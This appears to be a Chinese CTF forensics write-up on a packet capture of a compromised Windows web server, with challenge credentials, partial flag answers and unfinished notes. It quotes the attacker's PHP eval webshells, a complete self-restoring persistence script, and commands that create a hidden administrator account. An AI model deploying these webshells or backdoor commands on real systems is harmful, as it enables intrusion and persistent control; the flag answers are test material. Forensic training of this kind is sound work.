# 流量捕获+emergency

有一台客户的服务器被黑客入侵了，好在安全工程师开启了流量包，请你完成这些题目，提升服务器的安全性吧！

用户名：Administrator
密码：Qsnctf2025

链接: https://pan.baidu.com/s/1LxYbnbYPpzTj0eL1yRKxiA 提取码: db5g
压缩包密码：349df0a5061cfd47e375c8dba9c773d7
赛题为：流量捕获.pcapng + emergency靶场

## 任务1 
任务名称：提交黑客的IP地址
任务分数：2.00
任务类型：静态Flag
提交格式为flag{0.0.0.0}

protocol == http过滤，发现10.0.100.69攻击10.0.100.13

```text
flag{10.0.100.69}
```

## 任务2 
任务名称：提交黑客初始连接的PHP一句话木马密码
任务分数：2.00
任务类型：静态Flag
提交格式为flag{abc}

protocol == http过滤，发现No.894 No.901内容是初始连接的PHP一句话木马

No.894  
/admin/system_manage/user_config_add.html  
Form item: "value" = "<?php @eval([$_POST['shell']]) ?>"  

No.901  
{"status":1,"message":"\u64cd\u4f5c\u6210\u529f\uff01"} 操作成功！  

```text
flag{shell}
```

## 任务3 
任务名称：提交黑客通过初始连接一句话木马后创建新的一句话木马文件的MD5
任务分数：2.00
任务类型：静态Flag
提交格式为flag{md5}

protocol == http过滤，发现No.931 No.932创建新的一句话木马文件
No.931  
POST /admin/system_manage/user_config_add.html 
Form item: "value" = "<?php system([$_POST['exec']]) ?>"

```text
flag{fdb61c3ef5d45ff8fa5691852be1f8d5}
```

## 任务4 
任务名称：提交黑客创建的不死马的密码
任务分数：2.00
任务类型：静态Flag
提交格式为flag{md5}

protocol == http过滤，发现No.54240  No.54250s是上传不死马bsm.php
No.54240  
C:/phpstudy_pro/WWW/bsm.php

```php
<?php
ignore_user_abort(true);
set_time_limit(0);

$shell_content = '<?php @eval($_POST["4aad625950d058c24711560e5f8445b9"]); ?>';
$shell_path = __DIR__ . '/.config.php';

while (true) {
    if (!file_exists($shell_path)) {
        file_put_contents($shell_path, $shell_content);
        chmod($shell_path, 0444); 
    }
    sleep(5);
}
?>
```

```text
flag{4aad625950d058c24711560e5f8445b9}
```

## 任务5 
任务名称：提交黑客上传的恶意文件（远程控制木马）的名称
任务分数：2.00
任务类型：静态Flag
提交格式为flag{abc.exe}

protocol == http过滤，发现No.68118 No.68167上传shell.exe，No.69165执行shell.exe
No.68118
C:/phpstudy_pro/WWW/shell.exe

No.69165  执行shell.exe
cd /d "C:\\phpstudy_pro\\WWW" & shell.exe & echo 8f92ab47 & cd & echo dbeb03f5

```text
flag{shell.exe}
```

## 任务6
任务名称：提交黑客上传的恶意文件（远程控制木马）的MD5
任务分数：2.00
任务类型：静态Flag
提交格式为flag{md5}

```text
flag{0410284ea74b11d26f868ead6aa646e1}
```

## 任务7
任务名称：提交黑客上传的恶意文件（远程控制木马）的端口
任务分数：2.00
任务类型：静态Flag
提交格式为flag{1234}

## 任务8
任务名称：请提交黑客创建用户账户的用户名
任务分数：2.00
任务类型：静态Flag
提交格式为flag{username}

## 任务9
任务名称：请提交黑客创建用户账户的密码
任务分数：2.00
任务类型：静态Flag
提交格式为flag{password}

## 任务10
任务名称：请提交黑客创建用户账户的时间
任务分数：2.00
任务类型：静态Flag
flag{2025/01/01 01:00:00}

3. No.53645 No.53648
    No.53645
    C:/phpstudy_pro/WWW/cache/chche_file/

    No.53648
    ./    2025-11-20 15:55:01 4096    0777
    ../ 2025-11-20 15:23:50 4096    0777
    categoryinfo.cache.php  2025-11-20 15:20:57 3613    0666
    configs.cache.php   2025-11-20 15:58:37 2131    0666
    mapping.cache.php   2025-11-20 15:58:37 721 0666
    member_group.cache.php  2025-11-20 15:21:56 1302    0666
    menu_string_1.cache.php 2025-11-20 15:58:37 7474    0666
    modelinfo.cache.php 2025-11-20 15:20:57 1085    0666
    urlrule.cache.php   2025-11-20 15:58:37 69  0666
    5d94a05

4. No.53704 No.53707
    No.53704  
    cd /d "C:/phpstudy_pro/WWW/cache/chche_file" & whoami & echo 8f92ab47 & cd & echo dbeb03f5

    No.53707  
    win-q80renkc8n8\administrator
    8f92ab47
    C:\phpstudy_pro\WWW\cache\chche_file
    dbeb03f5 

5. No.53718 No.53721  
    No.53718  
    C:/phpstudy_pro/

    No.53721  
    ./    2025-11-20 15:15:29 4096    0777
    ../     2025-11-20 15:15:09 4096    0777
    COM/    2025-11-20 15:45:57 16384   0777
    Extensions/ 2025-11-20 15:15:26 4096    0777
    WWW/    2025-11-20 15:19:32 4096    0777
    unins000.dat    2025-11-20 15:15:30 135271  0666
    unins000.exe    2025-11-20 15:15:04 953165  0777

6. No.53731 No.53734
    No.53731  
    C:/

    No.53734  
    \$Recycle.Bin/    2025-11-20 15:07:31 0   0777
    Documents and Settings/ 2025-11-20 15:06:48 0   0777
    PerfLogs/   2016-07-16 21:23:21 0   0777
    phpstudy_pro/   2025-11-20 15:15:29 4096    0777
    Program Files/  2025-11-20 15:31:40 4096    0555
    Program Files (x86)/    2016-07-16 21:23:24 4096    0777
    ProgramData/    2025-11-20 15:09:07 4096    0777
    Recovery/   2025-11-20 15:06:53 0   0777
    System Volume Information/  2025-11-20 15:06:19 0   0777
    Users/  2025-11-20 15:07:25 4096    0555
    Windows/    2025-11-20 15:44:40 20480   0777
    bootmgr 2016-12-14 18:39:07 389408  0444
    BOOTNXT 2016-07-16 21:18:08 1   0666
    pagefile.sys    1970-01-01 08:00:00     0

7. No.53746 No.53749  
    No.53746  
    C:/ProgramData/  

    No.53749  
    ./  2025-11-20 15:09:07 4096    0777
    ../ 2025-11-20 15:15:09 4096    0777
    Application Data/   2025-11-20 15:06:48 0   0777
    Comms/  2016-07-16 21:23:21 0   0777
    Documents/  2025-11-20 15:06:48 0   0777
    Microsoft/  2016-12-14 18:59:16 4096    0777
    Package Cache/  2025-11-20 15:08:31 4096    0777
    regid.1991-06.com.microsoft/    2025-11-20 15:07:16 0   0777
    SoftwareDistribution/   2016-07-16 21:23:21 0   0777
    Templates/  2025-11-20 15:06:49 0   0777
    USOPrivate/ 2016-12-14 19:06:59 0   0777
    USOShared/  2016-12-14 19:06:59 0   0777
    VMware/ 2025-11-20 15:09:07 4096    0777
    /   2025-11-20 15:06:48 0   0777
    /   2025-11-20 15:06:48 0   0777

8. No.53900 No.53903
    No.53900  
    C:/phpstudy_pro/WWW/

    No.53903
    ./  2025-11-20 15:19:32 4096    0777
    ../ 2025-11-20 15:15:29 4096    0777
    application/    2025-11-20 15:17:53 4096    0777
    cache/  2025-11-20 15:23:50 4096    0777
    common/ 2025-11-20 15:18:54 4096    0777
    error/  2025-11-20 15:15:29 4096    0777
    uploads/    2025-11-20 15:18:54 0   0777
    yzmphp/ 2025-11-20 15:17:52 0   0777
    .htaccess   2019-10-09 20:43:43 226 0666
    favicon.ico 2019-10-09 20:43:56 1150    0666
    index.php   2018-05-15 18:57:50 635 0666
    nginx.htaccess  2025-11-20 15:20:27 117 0666
    robots.txt  2019-10-11 20:46:56 87  0666
    安装前必读(重要).txt    2019-10-19 16:49:47 1463    0666
    

9. No.53923 No.53926 上传木马shell.php
    No.53923
    C:/phpstudy_pro/WWW/shell.php

    No.53926
    shell.php
    <?php @eval($_POST["qsnctf_2025_lab"]); ?>



10. No.53934 No.53937
    No.53934
    C:/phpstudy_pro/WWW/

    No.53937
    ./  2025-11-20 16:01:21 4096    0777
    ../ 2025-11-20 15:15:29 4096    0777
    application/    2025-11-20 15:17:53 4096    0777
    cache/  2025-11-20 15:23:50 4096    0777
    common/ 2025-11-20 15:18:54 4096    0777
    error/  2025-11-20 15:15:29 4096    0777
    uploads/    2025-11-20 15:18:54 0   0777
    yzmphp/ 2025-11-20 15:17:52 0   0777
    .htaccess   2019-10-09 20:43:43 226 0666
    favicon.ico 2019-10-09 20:43:56 1150    0666
    index.php   2018-05-15 18:57:50 635 0666
    nginx.htaccess  2025-11-20 15:20:27 117 0666
    robots.txt  2019-10-11 20:46:56 87  0666
    shell.php   2025-11-20 16:01:21 43  0666
    安装前必读(重要).txt   2019-10-19 16:49:47 1463    0666

11. No.53951 No.53953
    No.53951 
    
    No.53953
    C:/phpstudy_pro/WWW  C:  Windows NT WIN-Q80RENKC8N8 10.0 build 14393 (Windows Server 2016) AMD64 Administrator

12. No.53965 No.53967
    No.53965 
    
    No.53967
    C:/phpstudy_pro/WWW    C:  Windows NT WIN-Q80RENKC8N8 10.0 build 14393 (Windows Server 2016) AMD64 Administrator

13. No.53976  No.53978
    No.53976  
    C:/phpstudy_pro/WWW/

    No.53978    
    ./   2025-11-20 16:01:21 4096    0777
    ../ 2025-11-20 15:15:29 4096    0777
    application/    2025-11-20 15:17:53 4096    0777
    cache/  2025-11-20 15:23:50 4096    0777
    common/ 2025-11-20 15:18:54 4096    0777
    error/  2025-11-20 15:15:29 4096    0777
    uploads/    2025-11-20 15:18:54 0   0777
    yzmphp/ 2025-11-20 15:17:52 0   0777
    .htaccess   2019-10-09 20:43:43 226 0666
    favicon.ico 2019-10-09 20:43:56 1150    0666
    index.php   2018-05-15 18:57:50 635 0666
    nginx.htaccess  2025-11-20 15:20:27 117 0666
    robots.txt  2019-10-11 20:46:56 87  0666
    shell.php   2025-11-20 16:01:21 43  0666
    安装前必读(重要).txt   2019-10-19 16:49:47 1463    0666

14. 

15. No.54263 No.54273 No.54287
    No.54263 
    C:/phpstudy_pro/WWW/

    No.54273
    ./	2025-11-20 16:06:40	4096	0777
    ../	2025-11-20 15:15:29	4096	0777
    application/	2025-11-20 15:17:53	4096	0777
    cache/	2025-11-20 15:23:50	4096	0777
    common/	2025-11-20 15:18:54	4096	0777
    error/	2025-11-20 15:15:29	4096	0777
    uploads/	2025-11-20 15:18:54	0	0777
    yzmphp/	2025-11-20 15:17:52	0	0777
    .htaccess	2019-10-09 20:43:43	226	0666
    bsm.php	2025-11-20 16:06:40	340	0666
    favicon.ico	2019-10-09 20:43:56	1150	0666
    index.php	2018-05-15 18:57:50	635	0666
    nginx.htaccess	2025-11-20 15:20:27	117	0666
    robots.txt	2019-10-11 20:46:56	87	0666
    shell.php	2025-11-20 16:01:21	43	0666
    安装前必读(重要).txt	2019-10-19 16:49:47	1463	0666

    No.54287
    GET方法执行不死马

16. 

17. 

18. No.73580 No.73583  查看账号
    cd /d "C:\\phpstudy_pro\\WWW" & net user & echo 8f92ab47 & cd & echo dbeb03f5

    \\WIN-Q80RENKC8N8 ���û��ʻ�

    -------------------------------------------------------------------------------
    Administrator            DefaultAccount           Guest                    
    �����ɹ����ɡ�

    C:\phpstudy_pro\WWW

19. No.73634 No.73637 添加账号密码hidden$ P@ssw0rd123
    cd /d "C:\\phpstudy_pro\\WWW" & net user hidden$ P@ssw0rd123 /add & echo 8f92ab47 & cd & echo dbeb03f5

20. No.73718 No.73721 添加账号hidden$到管理员组
    cd /d "C:\\phpstudy_pro\\WWW" & net localgroup administrators hidden$ /add & echo 8f92ab47 & cd & echo dbeb03f5

21. No.73753 No.73756
    cd /d "C:\\phpstudy_pro\\WWW" & net user & echo 8f92ab47 & cd & echo dbeb03f5

    \\WIN-Q80RENKC8N8 ���û��ʻ�

    -------------------------------------------------------------------------------
    Administrator            DefaultAccount           Guest                    
    �����ɹ����ɡ�

    C:\phpstudy_pro\WWW
